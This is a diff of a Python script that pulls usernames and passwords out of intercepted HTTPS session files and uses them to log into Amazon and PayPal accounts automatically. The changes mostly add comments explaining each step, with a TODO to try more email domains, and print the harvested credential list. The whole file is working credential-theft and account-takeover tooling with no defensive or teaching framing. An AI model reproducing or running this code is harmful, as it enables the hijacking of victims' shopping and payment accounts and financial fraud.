@@ -1,21 +1,18 @@
 import os, mechanize, re, socket, netifaces, getopt, sys
 
-#from socket import *
-from struct import *
-from time import sleep
+directory='./HTTPS/'            #directory to find HTTPS sessions
+uLabel=['username=', 'user=']   #list of label of username field
+pLabel=['password=', 'pass=']   #list of label of password field
+endChar=['&','\n']              #expected end characters of fields
 
-directory='./HTTPS/'
-uLabel=['username=', 'user=']
-pLabel=['password=', 'pass=']
-endChar=['&','\n']
-
-
-
-
-def createWorkList():
-    global directory
-    global uLabel
-    global pLabel
+                                #scan all valid files in HTTPS directory 
+                                #looking for username and password labels
+                                #if labels are found, add file to workList
+                                #outputs list of intersting file names
+def createWorkList():                   
+    global directory                    
+    global uLabel                       
+    global pLabel                       
     
     workList=[]
     
@@ -41,6 +38,10 @@ def createWorkList():
                     workList.append(validFile)
     return workList
 
+                                #run loop for each file in the worklist
+                                #find username label and end character 
+                                #username is text between the each index
+                                #outputs list of usernames
 def createUsernameList(wl):
     global uLabel
     global endChar
@@ -73,6 +74,10 @@ def createUsernameList(wl):
     return usernameList
 
     
+                                #run loop for each file in the worklist
+                                #find password label and end character 
+                                #password is text between the each index
+                                #outputs list of passwords
 def createPasswordList(wl):
     global pLabel
     global endChar
@@ -103,6 +108,9 @@ def createPasswordList(wl):
         i=i+1
     return passwordList
 
+                                #combine username and passwords into list
+                                #list is combination of username, password
+                                #outputs list of username password pairs
 def createCredentialPairList(ul,pl):
     credPairList=[]
     i=0
@@ -111,6 +119,12 @@ def createCredentialPairList(ul,pl):
         i=i+1
     return credPairList
 
+                                #navigates to Amazon and loads login form
+                                #appends email address domain to username  ***add function to append multiple domains***
+                                #attempts to login using credential pairs
+                                #navigates to private page and prints title
+                                #sign out to ready browser for next login
+                                #prints details of success or failed login
 def amazon(cpl):
     i=0
     while(i<len(cpl)):
@@ -120,7 +134,7 @@ def amazon(cpl):
    
         sign_in=br.open('https://www.amazon.com/gp/sign-in.html')  
         br.select_form(name='signIn')  
-        br['email']=cpl[i][0] + '@gmail.com'
+        br['email']=cpl[i][0] + '@gmail.com' #domain name manually appended to usernames
         br['password']=cpl[i][1]
         logged_in=br.submit() 
         br.open('https://www.amazon.com/gp/css/order-history/ref=nav_youraccount_orders')
@@ -133,6 +147,12 @@ def amazon(cpl):
             print 'TRY OTHER CREDENTIALS'
         i=i+1
 
+                                #navigates to Amazon and loads login form
+                                #appends email address domain to username  ***add function to append multiple domains***
+                                #attempts to login using credential pairs
+                                #navigates to private page and prints title
+                                #sign out to ready browser for next login
+                                #prints details of success or failed login
 def paypal(cpl):
     i=0
     while(i<len(cpl)):
@@ -160,6 +180,5 @@ wl=createWorkList()
 ul=createUsernameList(wl)
 pl=createPasswordList(wl)
 cpl=createCredentialPairList(ul,pl)
-nm=createNetworkMap()
-ah=getActiveHosts(nm)
-
+print cpl
+print wl
